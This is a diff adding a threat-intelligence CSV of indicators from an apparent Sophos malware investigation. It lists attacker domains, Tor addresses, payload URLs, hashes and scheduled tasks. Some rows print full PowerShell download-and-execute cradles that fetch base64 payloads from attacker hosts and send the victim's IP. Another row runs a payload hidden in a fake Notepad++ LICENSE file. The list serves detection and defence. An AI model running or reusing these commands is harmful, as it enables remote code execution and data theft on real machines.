@@ -1,0 +1,44 @@
+Indicator_type,Data,Note,
+Description,https://news.sophos.com/en-us/2023/08/10/image-spam-attack,IOCs from this incident,
+domain,aircourier-company[.]com,Conventional website used by the threat actor,
+domain,safedelivery-company[.]com,Conventional website used by the threat actor,
+domain,exmb25nic6n25sclnf44rrgynquns7u3zjqa33x3uztwbmsuptf7gyid[.]onion,Tor (dark web) website used by the threat actor,
+domain,um2kc2ahigbq7t2rchk3tnxnjzvrddbhxkcy573dqxci44wvi4ge5cad[.]onion,Tor (dark web) website used by the threat actor,
+domain,fq5rdcppmv7cqjhretm3owbnj4hskcv37bcgx5rpbdbhqfefzix4tiyd[.]onion,Tor (dark web) website used by the threat actor,
+domain,xaoqohhckbb3pnxtyqzj6pkuzckt2urbeiyd5xlanmw52expmohl7dyd[.]onion,Tor (dark web) website used by the threat actor,
+domain,3emyw4wto7tgupbisnbdbkbyaamb7p7dpxp6lnfqwyemskmmar3fugad[.]onion,Tor (dark web) website used by the threat actor,
+domain,carpoollk[.]com,Conventional website used by the threat actor,
+url,hxxps://carpoollk[.]com/se/maind.ps1,Payload delivery URL,
+url,hxxps://aircourier-company[.]com/index/tracking_pack_ch_4254qj6405mo601615yxq41298?next=1,Payload delivery URL,
+url,hxxps://safedelivery-company[.]com/manager/tracking_pack_ch_4254qj6405mo601615yxq41298,Payload delivery URL,
+filename,sendung_N03012_16092022.com,initial payload name,
+filename,SECURE DELIVERY SERVICE.EXE,dropped executable found in %temp%,
+sha256,44ccf669eec9f9b9695e0eb255b729df14f63485d85faf5375b5e7efb35a9d3e,ms.ps1 script,
+sha256,8ebcc0d9a7883d6526aad38492aa6f2d2192a817591aeb4b971cb2ba3d447ef0,modified LICENSE file with appended base64,
+sha256,3ba53f06b81005d0da9dc2e83feb4dd983884ef5533fcec2e8e3772e1ee1a615,Decoded first-level output of LICENSE base64,NOT on VT
+sha256,2700054554608a0a1d53fd65067b19d3a1dc0297d6bcfcc4292eec37cde07c18,Decoded second-level output from LICENSE script 1,NOT on VT
+sha256,bef6a0755ac4a42697f45843562cc7ce7d1454a85bddc458d2cd99658cf57b71,Decoded second-level output from LICENSE script 2,NOT on VT
+sha256,c7c9b1373af60159fe65915116a961be0e74c3719c2f482c91ca88dd738bff78,Decoded second-level output from LICENSE script 3,NOT on VT
+sha256,d339ce37d632cee2d457c21b8dbe04fe69930cde0cea13a96593403130abdb54,Installer found on VT that may be the original source,
+sha256,782a82e755c16bf653cb3ab5a65bb58638a16cf2b04e1f1cf454b9bced91a81b,another installer found on VT that contains many of the same programs and files as on the target's machine,
+sha256,4000f66ed28d407208d0e87875ffa0a55d4079955089e6c2a6d5a057b33841f6,Notepad++ application from program directory,NOT on VT
+sha256,5507b8fcfddc3c21f08551a2388fdf4c41fd13531dfed1d6b6d20388440f34db,npp.zip archive found on VT,
+sha256,23e87538d4c06ac6c640fe8dbe6992bf652ecdcaa1f0cf9b5e5108d0655fe2c7,PUA: Windows Socat tool found on target's computer; Reference: https://www.redhat.com/sysadmin/getting-started-socat,
+sha256,301b2b0c6eef71a33312207abf6c4b7f0fd703a988529a9cd457a412eb9f9992,Comodo EV CA certificate file installed by PowerShell script into Firefox CA storage,
+ssl_certificate_serial,00f45b2f89e952dab0,serial number for COMODO RSA EV cert,
+command_line,GUP.exe -dexmb25nic6n25sclnf44rrgynquns7u3zjqa33x3uztwbmsuptf7gyid[.]onion -s18912,invoked by Schedulted Task,
+domain_port,exmb25nic6n25sclnf44rrgynquns7u3zjqa33x3uztwbmsuptf7gyid[.]onion:18912,[.]onion site and port used for outbound communication,
+domain_port,um2kc2ahigbq7t2rchk3tnxnjzvrddbhxkcy573dqxci44wvi4ge5cad[.]onion:18912,[.]onion site and port used for outbound communication,
+domain_port,fq5rdcppmv7cqjhretm3owbnj4hskcv37bcgx5rpbdbhqfefzix4tiyd[.]onion:18912,[.]onion site and port used for outbound communication,
+domain_port,xaoqohhckbb3pnxtyqzj6pkuzckt2urbeiyd5xlanmw52expmohl7dyd[.]onion:18912,[.]onion site and port used for outbound communication,
+domain_port,3emyw4wto7tgupbisnbdbkbyaamb7p7dpxp6lnfqwyemskmmar3fugad[.]onion:18912,[.]onion site and port used for outbound communication,
+command_line,powershell.exe /c $p=Start-Process -FilePath $env:LOCALAPPDATA\Notepad++\notepad++.exe -PassThru; Write-Host Notepad PID is $($p.Id),Command to identify the PID of the Notepad++ process,
+command_line,powershell.exe -c IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString((Get-Content 'C:\\Users\\daniela.minnig\\AppData\\Local\\Notepad++\\updater\\LICENSE' | Out-String | % { $_[7804 ..($_.Length-1)] }))))),Command to decode the LICENSE text file and execute the payloads,
+scheduled_task_path,GUPP.exe -tplugins -s18912,"Command executed by a scheduled task named ""Update Plugins Notepad++""",
+command_line,Invoke-Expression([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('httpx://script.google.com/macros/s/AKfycby-cKMXZxHp3swavFP4kmj_yGdBNbBN1kw-ygkn0KJuctbU_2aDkgMGzb2xLAchiJt2/exec?se=1&ip='+(New-Object System.Net.WebClient).DownloadString('httpx://api.ipify.org/'))))),Command to download and decode base64 from a now-unavailable Google cloud location and to obtain the public facing IP address from IPify service,
+command_line,powershell.exe -nop -c Invoke-Expression([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://carpoollk[.]com/se/maind.ps1')))),Command to retrieve a PowerShell script from a domain the attacker controls,
+sha256,4000f66ed28d407208d0e87875ffa0a55d4079955089e6c2a6d5a057b33841f6,executable signed by Cloud Accountants Limited,Notepad++.exe
+sha256,abd20c3cc7a02fce3a39cf03225f321d8c92db4a96b54d87dcac7ddc112c7c00,executable signed by Cloud Accountants Limited,GUP.exe
+sha256,fcc9600aaa6b398b861962bb5ef8cd88072be3c619c235e890909e4f12374005,executable signed by Cloud Accountants Limited,GUPP.exe
+sha256,23e87538d4c06ac6c640fe8dbe6992bf652ecdcaa1f0cf9b5e5108d0655fe2c7,executable signed by BULDOK LIMITED,socat.exe
+sha256,d8ac4f43a5279e3aa33b2a743e17e1c59ba170c74965c45feca529fd8e817140,Installer found on VT closely related to the original source,Australia incident
